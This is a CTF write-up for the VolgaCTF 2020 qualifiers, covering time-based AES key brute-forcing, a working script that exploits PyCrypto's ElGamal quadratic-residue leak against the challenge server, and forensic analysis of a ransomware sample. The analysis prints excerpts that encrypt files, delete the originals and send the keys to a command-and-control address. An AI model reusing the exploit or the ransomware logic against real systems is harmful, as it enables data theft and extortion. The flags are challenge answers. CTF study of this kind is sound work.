---
layout: post
title: "VolgaCTF 2020"
subtitle: "Qualifiers"
date: 2020-03-29
head_ctf_categories:
  - crypto
  - forensics
---

# Crypto

## Noname

> I have Noname; I am but two days old.

We are given the following encryptor

```python
from Crypto.Cipher import AES
from secret import flag
import time
from hashlib import md5

key = md5(str(int(time.time()))).digest()
padding = 16 - len(flag) % 16
aes = AES.new(key, AES.MODE_ECB)

outData = aes.encrypt(flag + padding * ('0'+hex(padding)[2:]).decode('hex'))

aes.decrypt(outData)

print outData.encode('base64')
```

with the encrypted text:
`uzF9t5fs3BC5MfPGe346gXrDmTIGGAIXJS88mZntUWoMn5fKYCxcVLmNjqwwHc2sCO3eFGGXY3cswMnO7OZXOw==`

The flag is encrypted with a key based on time.

This is not a safe at all. If you also add the intel on when the key was generated (challenge description), is just a question of bruteforcing the small amount of possibilities.

```python
from Crypto.Cipher import AES
from hashlib import md5

outData = ""
with open('encrypted', 'r') as f:
    outData = f.readline().decode('base64')

# 1d = 86400 , 3d = 259200
time = 1585073793 # curTime - 3d

while True:
    key = md5(str(time)).digest()
    aes = AES.new(key, AES.MODE_ECB)
    flag = aes.decrypt(outData)

    if "VolgaCTF" in flag:
        print(flag)
        break
    elif time == 1585332993: # curTime
        print("Nope, dang it!")
        break
    time += 1
```

🏁 _VolgaCTF{5om3tim3s_8rutf0rc3_i5_th3_345iest_w4y}_{:.spoiler}

## Guess

> Try to guess all encrypted bits and get your reward!

_Semplified view of the given script_
```python
#!/usr/bin/python
from __future__ import print_function
from Crypto.PublicKey import ElGamal
from Crypto import Random
from flag_file import flag
import Crypto.Random.random
import time
import sys

# Communication utils
def read_message():
    ...
def send_message(message):
    ...

# Algebra
def kronecker(x, p):
    q = (p - 1) / 2
    return pow(x, q, p)

def findQNR(p):
    r = Crypto.Random.random.randrange(2, p - 1)
    while kronecker(r, p) == 1:
        r = Crypto.Random.random.randrange(2, p-1)
    return r

def findQR(p):
    r = Crypto.Random.random.randrange(2, p - 1)
    return pow(r, 2, p)

# Main
if __name__ == '__main__':
    try:
        while True:
            key = ElGamal.generate(512, Random.new().read)
            runs = 1000
            successful_tries = 0

            send_message('(y, p) = ({0}, {1})'.format(key.y, key.p))

            for i in xrange(runs):
                plaintexts = dict()
                plaintexts[0] = findQNR(key.p)
                plaintexts[1] = findQR(key.p)

                challenge_bit = Crypto.Random.random.randrange(0,2)
                r = Crypto.Random.random.randrange(1,key.p-1)
                challenge = key.encrypt(plaintexts[challenge_bit], r)

                # Send challenge
                send_message(challenge)

                # Receive challenge_bit
                received_bit = read_message()
                if int(received_bit) == challenge_bit:
                    successful_tries += 1

            if successful_tries == runs:
                send_message(flag)

    except Exception as ex:
        send_message('Something must have gone very, very wrong...')
    finally:
        pass
```

Since the given script doesn't seems to have any major problems, we searched if ElGamal had any vulnerabilities or way of knowing if something get leaked in this implementation.

We stumbled upon [this github issue](https://github.com/dlitz/pycrypto/issues/253) that points out a problem in the implementation of ElGamal in PyCrypto.

We haven't fully understood the reasons, but here's the concept.

ElGamal encrypted messages belongs to one of two classes with a 50% 50% chanche.
Because of the worng implementation it's possibile to distinguish messagges in different classes.

That's exacly our case. Therefore, adjusting the [PoC](https://github.com/TElgamal/attack-on-pycrypto-elgamal) to our case gets us the flag.

```python
# https://github.com/TElgamal/attack-on-pycrypto-elgamal
# https://github.com/dlitz/pycrypto/issues/253

from pwn import *
from Crypto.PublicKey import ElGamal
from Crypto import Random
import Crypto.Random.random

def kronecker(x,p):
    ...
def findQNR(p):
    ...
def findQR(p):
    ...

conn = remote('guess.q.2020.volgactf.ru', 7777)

key = conn.recvline()[10:].rstrip().split(',')
keyY = int(key[0])
keyP = int(key[1][1:-1])
print(str.format("[*] received key (y, p): ({}, {})", keyY, keyP))

challenge = dict()

run = 1
while True:
    line = conn.recvline()
    if "Volga" in line: # Check if flag has been print
        print(line)
        break

    line = line.rstrip()[1:-1].split(', ')
    challenge[0] = long(line[0])
    challenge[1] = long(line[1])

    output = -1
    if (kronecker(keyY, keyP) == 1) or (kronecker(challenge[0], keyP) == 1):
        if kronecker(challenge[1], keyP) == 1:
            output = 1
        else:
            output = 0
    else:
        if kronecker(challenge[1], keyP) == 1:
            output = 0
        else:
            output = 1

    print(str.format("[*] ({}) guessed output: {}", run, output))
    conn.sendline(str(output))

    run += 1
```

# Forensics

## Script kiddie

> One of my students felt like a cool ransomware hacker. This is just as funny as stupid, for we have all the traffic been written...

All we have is an .ova image.

Extracting it with `tar -xvf ubuntu.ova` gets us the .vmdk which can then be mounted.

Looking throught the fs we see two users in the /home folder with the following relevant files.

```
/home
+-- test
|   |-- ...
|   |-- .bash_history
|   \-- data/secrets.txt.enc
|
\-- prod
    |-- ...
    \-- net_dumps/dump.pcap
```

The `test` user was the one affected by the ransomware and the ransomware itself was deleted.
However, a trace has been left in .bash_history.

```bash
...
rm clev.py
...
```

The script could be found analyzing the exported objects in the found `dump.pcap`.
After a quick de-obfuscation, here are the important parts.

```python
from Crypto.Cipher import AES

def addPadding(u):
    # add padding for aes 16 block size

class V():
    def __init__(self):
        # get user OS

    def encryptFile(self, key, file):
        try:
            f = open(file, 'rb')
            d = f.read()
            f.close()
            d = addPadding(d)
            q = key.encrypt(d)
            f = open(file+'.enc', 'wb')
            f.write(q)
            f.close()
            os.remove(file)
        except:
            pass

    def gen_keys_and_encrypt(self):
        M = []
        for x in range(16):
            key = ''.join(random.choices(string.ascii_letters, k=16))
            M.append(key)
        u = ','.join(k for k in M)
        u = bytes(u, "utf-8")
        u = base64.b64encode(u)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.38', 9999))
        s.sendalexit(bytes(self.id, "utf-8"))
        s.recv(1)
        s.sendalexit(u)
        encKey = AES.new(key, AES.MODE_ECB)
        # encrypt all files with ext ['doc', '.txt', '.rc', '.ini', '.dat', '.conf', '_history']:
```

The generated keys themselves are secure,

```python
key = ''.join(random.choices(string.ascii_letters, k=16))
```

but they are then sended to CnC server using only base64.

Following the tcp stream to `192.168.1.38:9999` in the `dump.pcap` file, reveals the base64 keys.

```python
from Crypto.Cipher import AES

encFile = ""
with open('secrets.txt.enc', 'r') as f:
    encFile = f.read()

keys = ["mTGeljhDRKASKKhQ","FLrsSEveQQiloPRn","XedXHYBUHpIXDBJP","IOGPErjosxNiQrNM","RzvpbEURLdFfaGFM","vdBVDCvixjShCQvy","EQlcsnUtzCHyFPHM","JkDijgAFiVBWJaLz","ghcPIOSqCdCTqOpD","DneCwbkDHkojppHm","lVRZReAlaIzHgisc","NdjcgVVjiinxftCC","RkgLpRCqrnibrqsN","kzewteAgPEZdkzQJ","HnpGoUeqckEqxpQm","LSNWRarThRdiPLpM"]

for key in keys:
    aes = AES.new(key, AES.MODE_ECB)
    flag = aes.decrypt(encFile)

    assert flag == 'flag{26c08ad080830d6dcd76c15009ab6b03}'
```
